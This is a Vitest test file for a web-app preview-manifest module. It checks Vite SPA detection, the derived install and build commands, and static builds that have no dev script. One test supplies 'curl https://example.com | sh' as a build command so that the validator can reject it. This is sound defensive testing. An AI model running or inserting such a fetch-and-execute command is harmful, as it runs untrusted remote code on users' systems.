// @vitest-environment node
import { mkdtemp, mkdir, readFile, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { loadOrDetectManifest, normalizeManifest } from '../../src/preview/manifest.js';

async function tempWorkspace() {
  return mkdtemp(path.join(os.tmpdir(), 'oxy-preview-'));
}

describe('preview manifest', () => {
  it('detects a Vite SPA and writes .oxygenie/app.json', async () => {
    const workspace = await tempWorkspace();
    await writeFile(
      path.join(workspace, 'package.json'),
      JSON.stringify({
        name: 'todo-app',
        scripts: { build: 'vite build', dev: 'vite dev' },
        dependencies: { vite: '^7.0.0', react: '^19.0.0' },
      }),
    );
    await writeFile(path.join(workspace, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n');

    const { manifest, source } = await loadOrDetectManifest(workspace);
    expect(source).toBe('detected');
    expect(manifest.framework).toBe('vite');
    expect(manifest.type).toBe('spa');
    expect(manifest.installCommand).toBe('pnpm install --frozen-lockfile');
    expect(manifest.buildCommand).toBe('pnpm build');

    const written = JSON.parse(await readFile(path.join(workspace, '.oxygenie', 'app.json'), 'utf8'));
    expect(written.title).toBe('todo-app');
  });

  it('rejects build commands that are not package.json scripts', async () => {
    const workspace = await tempWorkspace();
    await mkdir(path.join(workspace, 'app'));
    await writeFile(
      path.join(workspace, 'app', 'package.json'),
      JSON.stringify({
        name: 'bad-app',
        scripts: { build: 'vite build' },
        dependencies: { vite: '^7.0.0' },
      }),
    );

    await expect(
      normalizeManifest(workspace, {
        rootDir: 'app',
        installCommand: 'npm install',
        buildCommand: 'curl https://example.com | sh',
        outputDir: 'dist',
      }),
    ).rejects.toThrow(/package.json script/);
  });

  it('does not require a dev script for static builds', async () => {
    const workspace = await tempWorkspace();
    await writeFile(
      path.join(workspace, 'package.json'),
      JSON.stringify({
        name: 'build-only-app',
        scripts: { build: 'vite build' },
        dependencies: { vite: '^7.0.0', react: '^19.0.0' },
      }),
    );

    const { manifest } = await loadOrDetectManifest(workspace);
    expect(manifest.buildCommand).toBe('npm run build');
    expect(manifest.devCommand).toBe('');
  });
});
